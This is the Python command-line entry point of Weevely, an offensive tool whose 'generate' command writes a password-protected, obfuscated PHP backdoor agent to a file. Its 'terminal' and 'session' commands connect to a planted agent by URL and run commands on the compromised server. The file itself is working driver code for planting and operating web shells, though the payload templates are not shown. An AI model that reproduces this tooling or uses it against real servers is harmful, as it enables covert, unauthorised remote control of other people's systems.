#!/usr/bin/env python3
import glob
import os
import pprint
import sys

import argcomplete

from weevely.core import generate
from weevely.core import messages
from weevely.core import modules
from weevely.core.argparsers import CliParser
from weevely.core.config import agent_templates_folder_path
from weevely.core.config import obfuscators_templates_folder_path
from weevely.core.loggers import dlog
from weevely.core.loggers import log
from weevely.core.sessions import SessionFile
from weevely.core.sessions import SessionURL
from weevely.core.terminal import Terminal
from weevely.core.weexceptions import ArgparseError
from weevely.core.weexceptions import FatalException


if sys.stdout.encoding is None:
    print("Please set PYTHONIOENCODING=UTF-8 running 'export PYTHONIOENCODING=UTF-8' before starting Weevely.")
    sys.exit(1)


def main(arguments):
    if arguments.command == "generate":
        obfuscated = generate.generate(
            password=arguments.password, obfuscator=arguments.obfuscator, agent=arguments.agent
        )

        generate.save_generated(obfuscated, arguments.path)

        if arguments.path != "-":
            log.info(
                messages.generate.generated_backdoor_with_password_s_in_s_size_i
                % (arguments.path, arguments.password, len(obfuscated))
            )

        return

    if arguments.command == "terminal":
        session = SessionURL(url=arguments.url, password=arguments.password)

    elif arguments.command == "session":
        session = SessionFile(arguments.path)

    dlog.debug(pprint.pformat(session))

    modules.load_modules(session)

    if not arguments.cmd:
        Terminal(session).cmdloop()
    else:
        term = Terminal(session)
        term.precmd(arguments.cmd)
        term.onecmd(arguments.cmd)


def cli():
    parser = CliParser(prog="weevely")
    subparsers = parser.add_subparsers(dest="command")

    terminalparser = subparsers.add_parser("terminal", help="Run terminal or command on the target")
    terminalparser.add_argument("url", help="The agent URL")
    terminalparser.add_argument("password", help="The agent password")
    terminalparser.add_argument("cmd", help="Command", nargs="?")

    sessionparser = subparsers.add_parser("session", help="Recover an existing session")
    sessionparser.add_argument("path", help="Session file path")
    sessionparser.add_argument("cmd", help="Command", nargs="?")

    agents_available = [
        os.path.split(agent)[1].split(".")[0] for agent in glob.glob(f"{agent_templates_folder_path}/*.tpl")
    ]

    obfuscators_available = [
        os.path.split(agent)[1].split(".")[0] for agent in glob.glob(f"{obfuscators_templates_folder_path}/*.tpl")
    ]

    generateparser = subparsers.add_parser("generate", help="Generate new agent")
    generateparser.add_argument("password", help="Agent password")
    generateparser.add_argument("path", help="Agent file path")
    generateparser.add_argument(
        "-obfuscator",  # The obfuscation method
        choices=obfuscators_available,
        default="phar",
    )
    generateparser.add_argument(
        "-agent",  # The agent channel type
        choices=agents_available,
        default="obfpost_php",
    )

    parser.set_default_subparser("terminal")
    argcomplete.autocomplete(parser)

    try:
        arguments = parser.parse_args()
    except ArgparseError:
        parser.exit()

    try:
        main(arguments)
    except (KeyboardInterrupt, EOFError):
        log.info("Exiting.")
    except FatalException as e:
        log.critical(f"Exiting: {e}")


if __name__ == "__main__":
    cli()
